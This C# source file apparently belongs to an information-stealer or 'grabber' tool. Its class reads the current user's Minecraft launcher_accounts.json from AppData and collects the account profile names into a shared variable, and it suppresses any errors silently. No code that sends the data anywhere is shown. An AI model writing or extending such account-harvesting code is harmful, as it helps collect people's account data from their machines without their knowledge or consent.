using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.IO;
using System.Text.RegularExpressions;

using static helpers.Variables;

namespace helpers {
    class MinecraftAlts {
        public static void getMinecraftAccounts( ) {
            try {
                JObject obj = JsonConvert.DeserializeObject<JObject>(
                    File.ReadAllText( $@"C:\Users\{Environment.UserName}\AppData\Roaming\.minecraft\launcher_accounts.json" ) );
                Regex rgx = new Regex( "\".*?\"" );
                foreach ( JToken s in obj [ "accounts" ] ) {
                    Match mhc = rgx.Match( s.ToString( ) );
                    if ( mhc.Success ) {
                        mammt = obj [ "accounts" ] [ mhc.Value.Replace( "\"" , "" ) ] [ "minecraftProfile" ] [ "name" ] + " ";
                    }
                }
            } catch { mammt = "Impossible to find minecraft accounts"; }
        }
    }
}
